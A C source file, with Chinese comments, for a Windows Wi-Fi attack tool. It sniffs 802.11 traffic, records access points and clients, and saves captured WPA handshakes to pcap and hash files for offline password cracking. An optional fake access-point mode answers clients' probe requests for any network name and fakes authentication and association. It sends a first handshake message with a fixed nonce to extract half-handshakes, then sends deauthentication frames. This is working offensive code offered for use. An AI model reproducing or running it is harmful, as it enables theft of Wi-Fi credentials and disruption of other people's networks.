#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>

#include "wifi_parser.h"
#include "wifi_ctl.h"

int wifi_fake_ap_enable = 0;

typedef struct _pcap_file_info {
        FILE* fp;
        char file_name[512];
        pcap_hdr_t hdr;
} pcap_file_info, *ppcap_file_info;

static void l_getCurrentTime(gint32 *sec, gint32 *usec)
{
        ULARGE_INTEGER  utime, birthunix;
        FILETIME        systemtime;
        LONGLONG        birthunixhnsec = 116444736000000000;  /*in units of 100 ns */
        LONGLONG        usecs;
        
        GetSystemTimeAsFileTime(&systemtime);
        utime.LowPart  = systemtime.dwLowDateTime;
        utime.HighPart = systemtime.dwHighDateTime;
        
        birthunix.LowPart = (DWORD) birthunixhnsec;
        birthunix.HighPart = (DWORD)(birthunixhnsec >> 32);
        
        usecs = (LONGLONG) ((utime.QuadPart - birthunix.QuadPart) / 10);
        
        if (sec) *sec = (gint32) (usecs / 1000000);
        if (usec) *usec = (gint32) (usecs % 1000000);
}

void* open_pcap_file(const char* file_name)
{
        ppcap_file_info pcap_file;
        FILE* fp;
        size_t len;

        fp = fopen(file_name, "ab+");
        if (!fp)
                return NULL;

        pcap_file = malloc(sizeof(pcap_file_info));
        
        pcap_file->fp = fp;
        strncpy(pcap_file->file_name, file_name, 128);

        len = fread(&pcap_file->hdr, 1, sizeof(pcap_hdr_t), fp);
        if (len < sizeof(pcap_hdr_t)){
                pcap_file->hdr.magic_number = 0xa1b2c3d4;
                pcap_file->hdr.version_major = 0x2;
                pcap_file->hdr.version_minor = 0x4;
                pcap_file->hdr.thiszone = 0;
                pcap_file->hdr.sigfigs = 0;
                pcap_file->hdr.snaplen = 65535;
                pcap_file->hdr.network = LINKTYPE_IEEE802_11;
                fseek(fp, 0, SEEK_SET);
                fwrite(&pcap_file->hdr, sizeof(pcap_hdr_t), 1, fp);
        }

        fseek(fp, 0, SEEK_END);
        return pcap_file;
}

int write_pcap_file(void* file, void* buf, int len)
{
        pcaprec_hdr_t rec_hdr;
        ppcap_file_info pcap_file = (ppcap_file_info)file;

        if (len <= 0 || !file || !pcap_file->fp)
                return -1;

        rec_hdr.orig_len = rec_hdr.incl_len = len;
        l_getCurrentTime(&rec_hdr.ts_sec, &rec_hdr.ts_usec);

        fwrite(&rec_hdr, sizeof(pcaprec_hdr_t), 1, pcap_file->fp);
        fwrite(buf, len, 1, pcap_file->fp);
        fflush(pcap_file->fp);
        
        return 0;
}

int read_pcap_file(void* file, void* buf, int len)
{
        static int pcap_read_mod = FALSE;
        pcaprec_hdr_t rec_hdr;
        ppcap_file_info pcap_file = (ppcap_file_info)file;
        size_t read_len;

        if (!pcap_read_mod){
                fseek(pcap_file->fp, 0, SEEK_SET);
                read_len = fread(&pcap_file->hdr, 1, sizeof(pcap_hdr_t), pcap_file->fp);
                pcap_read_mod = TRUE;
        }

        read_len = fread(&rec_hdr, 1, sizeof(pcaprec_hdr_t), pcap_file->fp);
        if (read_len <=0 || rec_hdr.orig_len <= 0 || rec_hdr.orig_len > 65535)
                return -1;

        if ((int)rec_hdr.orig_len > len)
                return 0;

        read_len = fread(buf, 1, rec_hdr.orig_len, pcap_file->fp);

        return read_len;
}

void close_pcap_file(void* file)
{
        ppcap_file_info pcap_file = (ppcap_file_info)file;

        fclose(pcap_file->fp);

        free(pcap_file);
}

void printf_encode(char *txt, size_t maxlen, const uint8_t *data, size_t len)
{
	char *end = txt + maxlen;
	size_t i;

	for (i = 0; i < len; i++) {
		if (txt + 4 >= end || data[i] == 0)
			break;

                if (data[i] >= 32 && data[i] <= 127) {
                        *txt++ = data[i];
                } else {
                        txt += _snprintf(txt, end - txt, "%02x",
                                data[i]);
                }
        }
        
        *txt = '\0';
}

const char * wpa_ssid_txt(const uint8_t *ssid, size_t ssid_len, size_t out_max_len)
{
        static char ssid_txt[32 * 4 + 1];
        
        if (ssid == NULL) {
                ssid_txt[0] = '\0';
                return ssid_txt;
        }
        
        printf_encode(ssid_txt, sizeof(ssid_txt), ssid, ssid_len);

        if (out_max_len > 0 && strlen(ssid_txt) > out_max_len)
                ssid_txt[out_max_len] = 0;
        
        return ssid_txt;
}

char wifi_log_buf[512];
void wifi_log(const char *fmt, ...)
{
        va_list ap;

	va_start(ap, fmt);
        _vsnprintf(wifi_log_buf, sizeof(wifi_log_buf), fmt, ap);
        va_end(ap);
}

static pwifi_sta get_sta_by_mac(pwifi_ap ap, void* mac)
{
        pwifi_sta sta;

        if (!ap || !mac)
                return NULL;

        for (sta = ap->station; sta; sta = sta->next){
                if (memcmp(sta->mac, mac, 6) == 0)
                        return sta;
        }

        return NULL;
}

static void on_wifi_parse_recv(pwifi_parser parser, void* buf, int size, int channel);

static pfake_ap_entry get_fakeap_by_ssid(pwifi_sta sta, void* ssid, int ssid_len)
{
        pfake_ap_entry fake_ap;

        if (!sta || !ssid || ssid_len > 32)
                return NULL;

        for (fake_ap = sta->fake_ap; fake_ap; fake_ap=fake_ap->next){
                if (memcmp(fake_ap->ssid, ssid, ssid_len) == 0)
                        return fake_ap;
        }

        return NULL;
}

static pfake_ap_entry get_fakeap_by_bssid(pwifi_sta sta, void* bssid)
{
        pfake_ap_entry fake_ap;
        
        if (!sta || !bssid)
                return NULL;
        
        for (fake_ap = sta->fake_ap; fake_ap; fake_ap=fake_ap->next){
                if (memcmp(fake_ap->bssid, bssid, 6) == 0)
                        return fake_ap;
        }
        
        return NULL;
}

static pwifi_sta append_sta2ap(pwifi_ap ap, void* mac)
{
        pwifi_sta sta;
        pwifi_sta* psta;

        if (!ap || !mac || memcmp(ap->bssid, mac, 6) == 0)
                return NULL;

        sta = get_sta_by_mac(ap, mac);
        if (sta)
                return sta;
        
        sta = malloc(sizeof(wifi_sta));
        if (!sta)
                return NULL;

        memset(sta, 0, sizeof(wifi_sta));
        memcpy(sta->mac, mac, 6);

        for (psta = &ap->station; *psta; )
                psta = &(*psta)->next;

        *psta = sta;
        sta->ap = ap;
        ap->stat_count++;

        return sta;
}

static pwifi_ap get_ap_by_mac(pwifi_parser parser, void* mac)
{
        pwifi_ap ap;
        
        if (!parser || !mac || !parser->ap_list)
                return NULL;
        
        for (ap = parser->ap_list; ap; ap=ap->next){
                if (memcmp(ap->bssid, mac, 6) == 0)
                        return ap;
        }
        
        return NULL;
}

static pwifi_ap append_wifiap(pwifi_parser parser, void* mac)
{
        pwifi_ap ap, *pap;

        if (!parser || !mac)
                return NULL;

        ap = get_ap_by_mac(parser, mac);
        if (ap)
                return ap;

        ap = malloc(sizeof(wifi_ap));
        if (!ap)
                return NULL;

        memset(ap, 0, sizeof(wifi_ap));
        memcpy(ap->bssid, mac, 6);
        parser->ap_num++;

        for (pap = &parser->ap_list; *pap; )
                pap = &(*pap)->next;

        *pap = ap;
        return ap;
}

static PDOT11_INFO_ELEMENT dot11_getinfo_element(void* info_block, int len_block, int ele_id)
{
        PDOT11_INFO_ELEMENT info_element = (PDOT11_INFO_ELEMENT)info_block;
        
        if (!info_block || len_block < sizeof(DOT11_INFO_ELEMENT))
                return NULL;

        while ((char*)(info_element + 1) < (char*)info_block + len_block){
                if (info_element->ElementID == ele_id)
                        return info_element;

                info_element = (PDOT11_INFO_ELEMENT)((char*)(info_element + 1) + info_element->Length);
        }

        return NULL;
}

/* 
 * 抽取SSID以及MAC(BSSID)
 * Ref: extsta\st_aplst.c StaUpdateBSSEntry     Dot11GetInfoEle
 */
static void on_wifi_recv_beacon(pwifi_parser parser, PDOT11_MGMT_HEADER mpdu, int size, int channel)
{
        PDOT11_BEACON_FRAME beacon_frame = (PDOT11_BEACON_FRAME)(mpdu + 1);
        PDOT11_INFO_ELEMENT info_ele;
        int block_len = size - sizeof(DOT11_BEACON_FRAME);
        pwifi_ap ap;
        
        //ap = append_wifiap(parser, mpdu->BSSID);
        ap = append_wifiap(parser, mpdu->SA);
        ap->channel = channel;

        if (mpdu->FrameControl.Subtype == DOT11_MGMT_SUBTYPE_BEACON && !ap->beacon_frame){
                /* 记录一份beacom帧以便保存pcap文件 */
                ap->beacon_frame = malloc(size);
                ap->beacon_frame_len = size;                
                memcpy(ap->beacon_frame, mpdu, size);
        }
           
        info_ele = dot11_getinfo_element(beacon_frame + 1, block_len, DOT11_INFO_ELEMENT_ID_SSID);
        if (info_ele && info_ele->Length <= 32){
                memcpy(ap->essid, info_ele+1, info_ele->Length);
                ap->essid[info_ele->Length] = 0;
        }
        
        info_ele = dot11_getinfo_element(beacon_frame + 1, block_len, DOT11_INFO_ELEMENT_ID_DS_PARAM_SET);
        if (info_ele)
                ap->tag_channel = *(uint8_t*)(info_ele+1);

        if (dot11_getinfo_element(beacon_frame + 1, block_len, DOT11_INFO_ELEMENT_ID_RSN))
                ap->wpa_ver = 2;
        else if (dot11_getinfo_element(beacon_frame + 1, block_len, DOT11_INFO_ELEMENT_ID_VENDOR_SPECIFIC))
                ap->wpa_ver = 1;

}

#ifdef  WIFI_FAKE_AP

DOT11_MAC_ADDRESS fake_ap_mac = {"\x00\xe0\x6c\x81\x92\xf5"};
uint8_t ele_support_rates[10] = {"\x01\x08\x82\x84\x8b\x96\x0c\x12\x18\x24"};
uint8_t ele_rsn_info[22] = {"\x30\x14\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x02\x00\x00"};
USHORT ap_sn = 0;

void fake_essid2bssid(const char *name, int len, char *bssid)
{
        unsigned long h = 0, g;
        
        while (*name && len) {
                h = (h << 4) + *name++;
                if ((g = h & 0xf0000000))
                        h ^= g >> 24;
                h &= ~g;
                len--;
        }
        
        bssid[0] = 0x00;
        bssid[1] = 0x1d;
        *(int*)(bssid + 2) = (int)h;
}

/* 添加一个Fake Ap SSID到指定的station列表 */
static pfake_ap_entry append_fakeap2sta(pwifi_sta sta, void* ssid, int ssid_len)
{
        pfake_ap_entry fake_ap;
        pfake_ap_entry* pfap;

        if (!sta || !ssid || ssid_len < 1 || ssid_len > 32)
                return NULL;

        fake_ap = get_fakeap_by_ssid(sta, ssid, ssid_len);
        if (fake_ap)
                return fake_ap;

        fake_ap = malloc(sizeof(fake_ap_entry));
        if (!fake_ap)
                return NULL;

        memset(fake_ap, 0, sizeof(fake_ap_entry));
        memcpy(fake_ap->ssid, ssid, ssid_len);

        fake_essid2bssid(ssid, ssid_len, fake_ap->bssid);

        for (pfap = &sta->fake_ap; *pfap; )
                pfap = &(*pfap)->next;
        
        *pfap = fake_ap;
        return fake_ap;
}

/* 发送指定SSID广播数据包 */
BOOL wifi_send_ssid(const char* essid)
{
        UCHAR frame_buf[1024] = {0};
        PDOT11_MGMT_HEADER mgmt_hdt = (PDOT11_MGMT_HEADER)frame_buf;        
        PDOT11_BEACON_FRAME fixed_params = (PDOT11_BEACON_FRAME)(mgmt_hdt + 1);
        uint8_t* ele_p = (uint8_t*)(fixed_params + 1);
        DOT11_MAC_ADDRESS bssid;
        gint32 s = 0, us = 0;
        int essid_len = strlen(essid) > 32 ? 32:strlen(essid);
        
        fake_essid2bssid(essid, essid_len, bssid);
        
        mgmt_hdt->FrameControl.usValue = 0x0080;
        mgmt_hdt->DurationID = 0x13a;
        mgmt_hdt->SequenceControl.SequenceNumber = ap_sn++;
        memset(mgmt_hdt->DA, 0xff, 6);
        memcpy(mgmt_hdt->SA, bssid, 6);
        memcpy(mgmt_hdt->BSSID, bssid, 6);

        l_getCurrentTime(&s, &us);
        fixed_params->Timestamp = (ULONG64)(s << 32) + us;
        fixed_params->BeaconInterval = 0x64;
        fixed_params->Capability.usValue = 0x431;

        //SSID
        ele_p[0] = 0; ele_p[1]=(uint8_t)essid_len;
        memcpy(ele_p + 2, essid, essid_len);
        ele_p += 2 + essid_len;

        //Supported Rates
        memcpy(ele_p, ele_support_rates, sizeof(ele_support_rates));
        ele_p += sizeof(ele_support_rates);
        
        //Current Channel
        ele_p[0] = 3; ele_p[1] = 1; ele_p[2] = (uint8_t)wifi_get_channel();
        ele_p += 3;
        
        //ERP Info
        ele_p[0] = 0x2a; ele_p[1] = 1; ele_p[2] = 0;
        ele_p += 3;
        
        //RSN Info
        memcpy(ele_p, ele_rsn_info, sizeof(ele_rsn_info));
        ele_p += sizeof(ele_rsn_info);

        /*
        {
                void* pcap_file = open_pcap_file("dump.pcap");
                write_pcap_file(pcap_file, frame_buf, ele_p - frame_buf);
                close_pcap_file(pcap_file);
        }
        */        

        return wifi_write_packet(frame_buf, ele_p - frame_buf);
}

static void on_wifi_recv_probe(pwifi_parser parser, PDOT11_MGMT_HEADER mpdu, int size)
{
        uint8_t buf[256] = {0};
        PDOT11_MGMT_HEADER response_hdr = (PDOT11_MGMT_HEADER)buf;
        PDOT11_BEACON_FRAME fixed_params = (PDOT11_BEACON_FRAME)(response_hdr + 1);
        uint8_t* ele_p = (uint8_t*)(fixed_params + 1);
        gint32 s = 0, us = 0;
        PDOT11_INFO_ELEMENT ele_info;

        pwifi_ap ap;
        pwifi_sta sta;
        pfake_ap_entry fake_ap;
        
        ap = append_wifiap(parser, fake_ap_mac);
        sta = append_sta2ap(ap, mpdu->SA);

        //fake ap
        response_hdr->FrameControl.usValue = 0x0050;
        response_hdr->DurationID = 0x13a;
        response_hdr->SequenceControl.SequenceNumber = ap_sn++;
        
        //Fixed parameters
        l_getCurrentTime(&s, &us);
        fixed_params->Timestamp = (ULONG64)(s << 32) + us;
        fixed_params->BeaconInterval = 0x64;
        fixed_params->Capability.usValue = 0x431;

        //SSID
        ele_info = dot11_getinfo_element(mpdu + 1, size - sizeof(DOT11_MGMT_HEADER), DOT11_INFO_ELEMENT_ID_SSID);
        if (!ele_info || ele_info->Length == 0 || ele_info->Length > 32)
                return;

        fake_ap = append_fakeap2sta(sta, ele_info+1, ele_info->Length);
        if (fake_ap->wpa.flags & HDSK_FLAG_EAPOL2)
                return;

        wifi_log("fakeap probe %s\n", wpa_ssid_txt(fake_ap->ssid, 32, 16));

        memcpy(response_hdr->DA, mpdu->SA, 6);
        memcpy(response_hdr->SA, fake_ap->bssid, 6);
        memcpy(response_hdr->BSSID, fake_ap->bssid, 6);

        memcpy(ele_p, ele_info, ele_info->Length + sizeof(DOT11_INFO_ELEMENT));
        ele_p += ele_info->Length + sizeof(DOT11_INFO_ELEMENT);

        //Supported Rates
        memcpy(ele_p, ele_support_rates, sizeof(ele_support_rates));
        ele_p += sizeof(ele_support_rates);

        //Current Channel
        ele_p[0] = 3; ele_p[1] = 1; ele_p[2] = (uint8_t)wifi_get_channel();
        ele_p += 3;

        //ERP Info
        ele_p[0] = 0x2a; ele_p[1] = 1; ele_p[2] = 0;
        ele_p += 3;

        //RSN Info
        memcpy(ele_p, ele_rsn_info, sizeof(ele_rsn_info));
        ele_p += sizeof(ele_rsn_info);

        wifi_write_packet(buf, ele_p - buf);
}

static pfake_ap_entry mpdu2fakeap(pwifi_parser parser, PDOT11_MGMT_HEADER mpdu)
{
        pwifi_ap ap;
        pwifi_sta sta;

        ap = append_wifiap(parser, fake_ap_mac);
        sta = get_sta_by_mac(ap, mpdu->SA);

        return  sta ? get_fakeap_by_bssid(sta, mpdu->DA):NULL;
}

static void on_wifi_recv_auth(pwifi_parser parser, PDOT11_MGMT_HEADER mpdu, int size)
{
        uint8_t buf[256] = {0};
        uint8_t auth_ok[6] = {"\x00\x00\x02\x00\x00\x00"};
        PDOT11_MGMT_HEADER response_hdr = (PDOT11_MGMT_HEADER)buf;
        pfake_ap_entry fake_ap = mpdu2fakeap(parser, mpdu);
        
        if (fake_ap == NULL)
                return;

        response_hdr->FrameControl.usValue = 0x00b0;        
        response_hdr->DurationID = 0x13a;
        response_hdr->SequenceControl.SequenceNumber = ap_sn++;

        memcpy(response_hdr->DA, mpdu->SA, 6);
        memcpy(response_hdr->SA, fake_ap->bssid, 6);
        memcpy(response_hdr->BSSID, fake_ap->bssid, 6);
        
        //auth ok
        memcpy(response_hdr+1, auth_ok, sizeof(auth_ok));

        wifi_write_packet(buf, sizeof(DOT11_MGMT_HEADER) + sizeof(auth_ok));

        wifi_log("fakeap auth %s\n", wpa_ssid_txt(fake_ap->ssid, 32, 16));
}

static void on_wifi_recv_association(pwifi_parser parser, PDOT11_MGMT_HEADER mpdu, int size)
{
        uint8_t buf[256] = {0};
        uint8_t association_ok[6] = {"\x31\x04\x00\x00\x01\xc0"};
        uint8_t llc_data[8] = {"\xaa\xaa\x03\x00\x00\x00\x88\x8e"};
        PDOT11_MGMT_HEADER response_hdr = (PDOT11_MGMT_HEADER)buf;
        EAPOL_PACKET eapol_msg1 = {0};
        
        pfake_ap_entry fake_ap = mpdu2fakeap(parser, mpdu);
        
        if (fake_ap == NULL)
                return;
        
        response_hdr->FrameControl.usValue = 0x0010;        
        response_hdr->DurationID = 0x13a;
        response_hdr->SequenceControl.SequenceNumber = ap_sn++;
        
        memcpy(response_hdr->DA, mpdu->SA, 6);
        memcpy(response_hdr->SA, fake_ap->bssid, 6);
        memcpy(response_hdr->BSSID, fake_ap->bssid, 6);

        //association ok
        memcpy(response_hdr+1, association_ok, sizeof(association_ok));

        //ele_support_rates
        memcpy((uint8_t*)(response_hdr+1) + sizeof(association_ok), ele_support_rates, sizeof(ele_support_rates));
        
        wifi_write_packet(buf, sizeof(DOT11_MGMT_HEADER) + sizeof(association_ok) + sizeof(ele_support_rates));

        //Sleep(100);
        
        //Send EAPOL Key 1
        response_hdr->FrameControl.usValue = 0x0208; //Qos
        response_hdr->SequenceControl.SequenceNumber = ap_sn++;

        //LLC
        memcpy(response_hdr+1, llc_data, sizeof(llc_data));
        //802.1x MESSAGE 1

        eapol_msg1.ProVer = 2;
        eapol_msg1.ProType = 3;
        eapol_msg1.Length = 0x5f00;     //95 bytes

        eapol_msg1.KeyDesc.Type = 2;
        eapol_msg1.KeyDesc.KeyInfo.Value = 0x8a00;
        eapol_msg1.KeyDesc.KeyLength = 0x1000;
        eapol_msg1.KeyDesc.ReplayCounter[7] = 1;

        memset(eapol_msg1.KeyDesc.KeyNonce, 0x11, LEN_KEY_DESC_NONCE);
        
        memcpy((uint8_t*)(response_hdr+1) + sizeof(llc_data), &eapol_msg1, sizeof(eapol_msg1));

        //sizeof(DOT11_MGMT_HEADER)+2+sizeof(llc_data)+sizeof(eapol_msg1) - MAX_LEN_OF_RSNIE);
        wifi_write_packet(buf, 131);

        //fake ap EAPOL MSG1 ok
        memcpy(fake_ap->wpa.anonce, eapol_msg1.KeyDesc.KeyNonce, LEN_KEY_DESC_NONCE);
        fake_ap->wpa.flags |= HDSK_FLAG_EAPOL1;

        wifi_log("fakeap %s eapol1 ok\n", wpa_ssid_txt(fake_ap->ssid, 32, 16));

}

#endif

static void* mem_search_tag(void* buf, int size, int tag)
{
        int* ptag;
        for (ptag = (int*)buf; (char*)ptag < (char*)buf + size - 4; ) {
                if (*ptag == tag)
                        return ptag;
                ptag = (int*)((char*)ptag + 1);
        }

        return NULL;
}

static void dump_wpa_hash(pwifi_sta sta, pwpa_hdsk wpa)
{
        FILE* fp;
        void* pcap_file;
        char pcap_name[256] = {0};
        char file_name[256] = {0};
        char null_nonce[32] = {0};
        int i;

        if (!sta || !wpa || !(wpa->flags & HDSK_FLAG_EAPOL2) ||
                wpa->ssid[0] == 0 ||
                memcmp(wpa->anonce, null_nonce, 32) == 0 ||
                memcmp(wpa->snonce, null_nonce, 32) == 0)
                return;
        
        strcpy(file_name, wpa_ssid_txt(wpa->ssid, 32, 0));

        if ((wpa->flags & 0xf) == 0xf){
                //dump pcap
                if (wpa->flags & HDSK_FLAG_FDUMP)
                        return;

                strcpy(pcap_name, file_name);
                strcat(pcap_name, ".pcap");

                pcap_file = open_pcap_file(pcap_name);

                write_pcap_file(pcap_file, sta->ap->beacon_frame, sta->ap->beacon_frame_len);

                for (i = 0; i < 4; i++)
                        write_pcap_file(pcap_file, &sta->eapol_frames[i][0], 
                                sta->eapol_frame_lens[i]);

                close_pcap_file(pcap_file);

                wpa->flags |= HDSK_FLAG_FDUMP;
        } else {                
                if (wpa->flags & HDSK_FLAG_HDUMP)
                        return;

                strcat(file_name, "_half");
                wpa->flags |= HDSK_FLAG_HDUMP;
        }

        wifi_log("wifi %s hash dump!!!\n", file_name);

        strcat(file_name, ".dat");
        
        fp = fopen(file_name, "wb+");
        fwrite(wpa, sizeof(wpa_hdsk), 1, fp);
        fclose(fp);        
}

static void on_wifi_parse_recv(pwifi_parser parser, void* buf, int size, int channel)
{
        PDOT11_MAC_HEADER mpdu = (PDOT11_MAC_HEADER)buf;
        pwifi_ap ap;
        pwifi_sta sta;

        if (mpdu->FrameControl.FromDS == 1 && mpdu->FrameControl.ToDS == 0){
                // Address2 -> BSSID    Address3 -> SA
                ap = append_wifiap(parser, mpdu->Address2);
                sta = append_sta2ap(ap, mpdu->Address3);
                ap->channel = channel;
        }
        
        if (mpdu->FrameControl.FromDS == 0 && mpdu->FrameControl.ToDS == 1){
                // Address1 -> BSSID    Address2 -> SA
                ap = append_wifiap(parser, mpdu->Address1);
                sta = append_sta2ap(ap, mpdu->Address2);
                ap->channel = channel;
        }  

        if (mpdu->FrameControl.Type == DOT11_FRAME_TYPE_MANAGEMENT){
                //处理管理帧 
                switch (mpdu->FrameControl.Subtype){
                case DOT11_MGMT_SUBTYPE_BEACON:
                case DOT11_MGMT_SUBTYPE_PROBE_RESPONSE:
                        on_wifi_recv_beacon(parser, (PDOT11_MGMT_HEADER)mpdu, size, channel);
                        break;
#ifdef WIFI_FAKE_AP
                case DOT11_MGMT_SUBTYPE_PROBE_REQUEST:
                        if (wifi_fake_ap_enable)
                                on_wifi_recv_probe(parser, (PDOT11_MGMT_HEADER)mpdu, size);
                        break;
                case DOT11_MGMT_SUBTYPE_AUTHENTICATION:
                        if (wifi_fake_ap_enable)
                                on_wifi_recv_auth(parser, (PDOT11_MGMT_HEADER)mpdu, size);
                        break;
                case DOT11_MGMT_SUBTYPE_ASSOCIATION_REQUEST:
                        if (wifi_fake_ap_enable)
                                on_wifi_recv_association(parser, (PDOT11_MGMT_HEADER)mpdu, size);
                        break;
#endif
                }
        } else if (mpdu->FrameControl.Type == DOT11_FRAME_TYPE_DATA){
                //处理EAPOL数据包
                //00 00 88 8e 01/02 03
                pfake_ap_entry fake_ap = NULL;
                char *p = mem_search_tag(mpdu + 1, size-sizeof(DOT11_MAC_HEADER), 0x8e880000);

#ifdef WIFI_FAKE_AP
                if (wifi_fake_ap_enable)
                        fake_ap = mpdu2fakeap(parser, (PDOT11_MGMT_HEADER)mpdu);
#endif
                
                if (p && *(int*)(p - 4) == 0x3aaaa 
                        && p + 4 + sizeof(EAPOL_PACKET) - MAX_LEN_OF_RSNIE <= (char*)buf + size){
                        PEAPOL_PACKET eapol = (PEAPOL_PACKET)(p + 4);
                        pwpa_hdsk wpa;

                        if (sta == NULL)
                                sta = append_sta2ap(ap, mpdu->Address1);

                        wpa = fake_ap ? (&fake_ap->wpa):(&sta->wpa);

                        if (wpa->flags & HDSK_FLAG_FDUMP || size > 512)
                                return;

                        if (fake_ap && wpa->flags & HDSK_FLAG_HDUMP)
                                return;

                        //500ms reset EAPOL datas
                        if (!fake_ap && GetTickCount() > sta->eapol_last_tick + 500){
                                memset(wpa, 0, sizeof(wpa_hdsk));
                                memset(sta->eapol_frames, 0, 4*512);
                        }

                        sta->eapol_last_tick = GetTickCount();
                        sta->eapol_count++;
                        //https://github.com/Ettercap/ettercap/blob/master/src/protocols/ec_wifi_eapol.c
                        //WPA VER = 1/2
                        wpa->keyver = eapol->KeyDesc.KeyInfo.KeyDescVer;
                        if (!eapol->KeyDesc.KeyInfo.KeyMic && 
                                !eapol->KeyDesc.KeyInfo.Secure &&
                                !eapol->KeyDesc.KeyInfo.Install &&
                                eapol->KeyDesc.KeyInfo.KeyAck){
                                //EAPOL 1
                                memcpy(wpa->anonce, eapol->KeyDesc.KeyNonce, LEN_KEY_DESC_NONCE);

                                memcpy(&sta->eapol_frames[0][0], buf, size);
                                sta->eapol_frame_lens[0] = size;

                                wpa->flags |= HDSK_FLAG_EAPOL1;
                                
                        }
                        
                        if (eapol->KeyDesc.KeyInfo.KeyMic && eapol->KeyDesc.KeyDataLen &&
                                !eapol->KeyDesc.KeyInfo.Secure &&
                                !eapol->KeyDesc.KeyInfo.Install &&
                                !eapol->KeyDesc.KeyInfo.KeyAck){
                                //EAPOL 2
                                int len = 4 + ((eapol->Length & 0xff)<<8) + (eapol->Length>>8);

                                memcpy(wpa->snonce, eapol->KeyDesc.KeyNonce, LEN_KEY_DESC_NONCE);
                                memcpy(wpa->keymic, eapol->KeyDesc.KeyMic, LEN_KEY_DESC_MIC);
                                memcpy(wpa->eapol, eapol, len);
                                
                                //mic置0
                                memset(&((PEAPOL_PACKET)wpa->eapol)->KeyDesc.KeyMic, 0, LEN_KEY_DESC_MIC);

                                //mac info
                                memcpy(wpa->apmac, mpdu->Address1, 6);
                                memcpy(wpa->stmac, mpdu->Address2, 6);

                                wpa->eapol_size = len;

                                wpa->flags |= HDSK_FLAG_EAPOL2;

                                if (fake_ap){
                                        memcpy(wpa->ssid, fake_ap->ssid, 32);
#ifdef WIFI_FAKE_AP
                                        wifi_log("fakeap " MACSTR " flag:%x recv eapol2 %s \n",                                                 
                                                MAC2STR(fake_ap->wpa.stmac),
                                                wpa->flags,
                                                wpa_ssid_txt(fake_ap->ssid, 32, 16));

                                        wifi_send_deauth(fake_ap->wpa.apmac, fake_ap->wpa.stmac);
#endif
                                        
                                } else 
                                        memcpy(wpa->ssid, sta->ap->essid, 32);
                                
                                memcpy(&sta->eapol_frames[1][0], buf, size);
                                sta->eapol_frame_lens[1] = size;
                        }

                        if (eapol->KeyDesc.KeyInfo.KeyMic && 
                                eapol->KeyDesc.KeyInfo.Install &&
                                eapol->KeyDesc.KeyInfo.KeyAck){
                                //EAPOL 3
                                memcpy(wpa->anonce, eapol->KeyDesc.KeyNonce, LEN_KEY_DESC_NONCE);

                                memcpy(&sta->eapol_frames[2][0], buf, size);
                                sta->eapol_frame_lens[2] = size;

                                wpa->flags |= HDSK_FLAG_EAPOL3;
                        }

                        if (eapol->KeyDesc.KeyInfo.KeyMic && 
                                !eapol->KeyDesc.KeyInfo.Install &&
                                !eapol->KeyDesc.KeyInfo.KeyAck && 
                                !eapol->KeyDesc.KeyDataLen){
                                //EAPOL 4
                                memcpy(&sta->eapol_frames[3][0], buf, size);
                                sta->eapol_frame_lens[3] = size;

                                wpa->flags |= HDSK_FLAG_EAPOL4;
                        }

                        dump_wpa_hash(sta, wpa);

                        if ((sta->wpa.flags & 0xf) == 0xf)
                                sta->ap->eapol_ok_count++;

                }
        }
}

int get_wifi_ap_count(void* parser)
{
        pwifi_ap ap;
        int i = 0;

        for (ap = ((wifi_parser*)parser)->ap_list; ap; ap = ap->next)
                i++;

        return i;
}
void dump_wifi_stations(void* parser, void* bssid)
{
        pwifi_ap ap = ((wifi_parser*)parser)->ap_list;
        pwifi_sta sta;
        pwifi_ap ch_ap_list[14][64] = {0};
        int i, ch, ch_ap_num[14] = {0};

        while (ap) {
                /* 显示具体的SSID */
                if (bssid){
                        if (memcmp(bssid, ap->bssid, 6) == 0){
                                printf(MACSTR "\twpa%d/ch:%d?%d\teapol:%d/%d\t%s\n",
                                        MAC2STR(ap->bssid),
                                        ap->wpa_ver,
                                        ap->tag_channel,
                                        ap->channel,
                                        ap->eapol_ok_count,
                                        ap->stat_count,
                                        wpa_ssid_txt(ap->essid, 32, 16));
                                
                                for (sta = ap->station; sta; sta = sta->next)
                                        printf("\tstation:" MACSTR "\teapol:%d\n",
                                        MAC2STR(sta->mac), 
                                        sta->eapol_count);
                        } else {

                        }
                        ap = ap->next;
                        continue;
                }

                /* 显示必要的输出信息 */
                if (ap->essid[0] && ap->tag_channel > 0 && ap->stat_count > 0) {
                        printf(MACSTR "\twpa%d/ch:%d?%d\teapol:%d/%d\t%s\n",
                                MAC2STR(ap->bssid),
                                ap->wpa_ver,
                                ap->tag_channel,
                                ap->channel,
                                ap->eapol_ok_count,
                                ap->stat_count,
                                wpa_ssid_txt(ap->essid, 32, 16));

                        for (sta = ap->station; sta; sta = sta->next){
                                if (sta->eapol_count)
                                        printf("\tstation:" MACSTR "\teapol:%d\n",
                                        MAC2STR(sta->mac), 
                                        sta->eapol_count);
                        }
                } else if (ap->tag_channel > 0 && ap->tag_channel < 14){
                        ch = ap->tag_channel -1;
                        if (ch_ap_num[ch] < 64){
                                ch_ap_list[ch][ch_ap_num[ch]] = ap;
                                ch_ap_num[ch]++;
                        }
                }
                ap = ap->next;
        }

        /* 依次显示频道ssid */
        for (ch=1; ch<14; ch++) {
                for (i=0; i<ch_ap_num[ch-1]; i++){
                        ap = ch_ap_list[ch-1][i];
                        printf(MACSTR "\twpa%d/ch:%d?%d\teapol:%d/%d\t%s\n",
                                MAC2STR(ap->bssid),
                                ap->wpa_ver,
                                ap->tag_channel,
                                ap->channel,
                                ap->eapol_ok_count,
                                ap->stat_count,
                                wpa_ssid_txt(ap->essid, 32, 16));
                }
        }

        printf("%s", wifi_log_buf);
}

void* init_wifi_parser()
{
        pwifi_parser parser = malloc(sizeof(wifi_parser));
        
        memset(parser, 0, sizeof(wifi_parser));
        
        parser->recv = on_wifi_parse_recv;

        return parser;
}

void close_wifi_parser(void* parser)
{
        
        free(parser);
}